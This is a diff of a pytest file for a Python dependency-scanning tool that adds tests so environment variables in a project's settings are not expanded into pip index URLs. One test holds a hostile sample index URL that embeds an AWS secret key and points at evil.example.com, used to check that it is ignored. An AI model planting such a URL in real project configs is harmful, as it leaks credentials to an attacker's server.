@@ -1,4 +1,5 @@
 import json
+import os
 import subprocess
 from pathlib import Path
 
@@ -298,24 +299,59 @@ def test_resolution_failure_aborts_the_whole_scan(fake_pip, tmp_path):
     assert 'No matching distribution found for click' in ' '.join(result.output.split())
 
 
-def test_scan_reads_the_package_index_from_the_project_settings(fake_pip, monkeypatch, tmp_path):
+def _scan_project(tmp_path, proj_cfg, env=None):
     from ts_scan.cli import cli
 
-    monkeypatch.setenv('HOME', str(tmp_path / 'home'))
-    monkeypatch.setenv('NEXUS_TOKEN', 's3cr3t')
     project = tmp_path / 'project'
     project.mkdir()
     (project / 'pyproject.toml').write_text('[project]\nname = "my-app"\n')
-    (project / 'tsproject.toml').write_text('pypi_indexUrl = "https://ci:${NEXUS_TOKEN}@nexus.example.com/simple"\n'
-                                            'pypi_extraIndexUrl = ["https://a.example.com/simple", "https://b.example.com/simple"]\n')
-    calls = fake_pip([_item('my-app', '1.0', project=True)])
+    (project / 'tsproject.toml').write_text(proj_cfg)
 
-    result = CliRunner().invoke(cli, ['scan', '-o', str(tmp_path / 'scan.json'), str(project)])
+    return CliRunner().invoke(cli, ['scan', '-o', str(tmp_path / 'scan.json'), str(project)], env=env)
+
+
+@pytest.fixture
+def no_tool_settings(monkeypatch, tmp_path):
+    monkeypatch.setenv('HOME', str(tmp_path / 'home'))
+    for name in list(os.environ):
+        if name.startswith(('TS_', 'PIP_')):
+            monkeypatch.delenv(name)
+
+
+def test_scan_reads_the_package_index_from_the_project_settings(fake_pip, no_tool_settings, tmp_path):
+    fake_pip([_item('my-app', '1.0', project=True)])
+
+    result = _scan_project(tmp_path, 'pypi_indexUrl = "https://nexus.example.com/simple"\n'
+                                     'pypi_extraIndexUrl = ["https://a.example.com/simple", "https://b.example.com/simple"]\n')
 
     assert result.exit_code == 0, result.output
     env = fake_pip.envs[0]
-    assert env['PIP_INDEX_URL'] == 'https://ci:s3cr3t@nexus.example.com/simple'
+    assert env['PIP_INDEX_URL'] == 'https://nexus.example.com/simple'
     assert env['PIP_EXTRA_INDEX_URL'] == 'https://a.example.com/simple https://b.example.com/simple'
+
+
+def test_scan_does_not_expand_environment_variables_from_the_project_settings(fake_pip, no_tool_settings,
+                                                                               monkeypatch, tmp_path):
+    # A foreign repository could otherwise send any environment variable to its own index
+    monkeypatch.setenv('AWS_SECRET_ACCESS_KEY', 's3cr3t')
+    fake_pip([_item('my-app', '1.0', project=True)])
+
+    result = _scan_project(tmp_path, 'pypi_indexUrl = "https://${AWS_SECRET_ACCESS_KEY}@evil.example.com/simple"\n')
+
+    assert result.exit_code == 0, result.output
+    assert "Ignoring 'pypi_indexUrl'" in ' '.join(result.output.split())
+    assert 'PIP_INDEX_URL' not in fake_pip.envs[0]
+
+
+def test_scan_takes_index_credentials_from_the_tool_settings(fake_pip, no_tool_settings, monkeypatch, tmp_path):
+    monkeypatch.setenv('NEXUS_TOKEN', 's3cr3t')
+    fake_pip([_item('my-app', '1.0', project=True)])
+
+    result = _scan_project(tmp_path, 'pypi_indexUrl = "https://nexus.example.com/simple"\n',
+                           env={'TS_SCAN_PYPI_INDEXURL': 'https://ci:${NEXUS_TOKEN}@nexus.example.com/simple'})
+
+    assert result.exit_code == 0, result.output
+    assert fake_pip.envs[0]['PIP_INDEX_URL'] == 'https://ci:s3cr3t@nexus.example.com/simple'
 
 
 @pytest.mark.parametrize('stderr', ['', 'ERROR: 401 Client Error for url: https://ci:s3cr3t@nexus.example.com/simple/click/\n'])
